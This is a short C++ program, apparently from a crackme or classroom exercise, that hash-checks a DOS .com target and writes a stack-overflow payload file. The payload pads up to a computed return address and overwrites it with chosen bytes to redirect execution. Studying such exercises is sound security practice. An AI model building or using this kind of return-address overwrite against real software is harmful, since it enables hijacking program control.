#include <stdio.h>
#include <iostream>
#include <assert.h>

const int RET_ADDR = 0xFFFC;
const int BUF_ADDR = 0x0166;
const int truehash = 7087220;

int hash_file(FILE* prog);
	

int main(){

	FILE* prog = fopen("W:\\TOBEHACK.com", "r");
	assert(prog);
	int hash = hash_file(prog);
	if(hash != truehash){
		printf("WRONG FILE");
		return 0;
	}

	FILE* output = fopen("W:\\hack.txt", "w");
	assert(output);
	int dif = RET_ADDR - BUF_ADDR + 3;

	char buf[dif] = {};

	buf[dif - 3] = 0x14;	
	buf[dif - 2] = 0x01;	
	buf[dif - 1] = '\r';	

	fwrite(buf, 1, dif, output);
	printf("All done\n");

	fclose(output); 
}

int hash_file(FILE* prog){
	assert(prog);

	fseek(prog, 0, SEEK_END);
	int file_size = ftell(prog);
	fseek(prog, 0, SEEK_SET);
	
	char* buff = new char[file_size];
	fread(buff, sizeof(char), file_size, prog);

	int hash = 0;
	for(int i = 0; i < file_size; ++i)
		hash += buff[i] * i * 31;
	
	return hash;
}
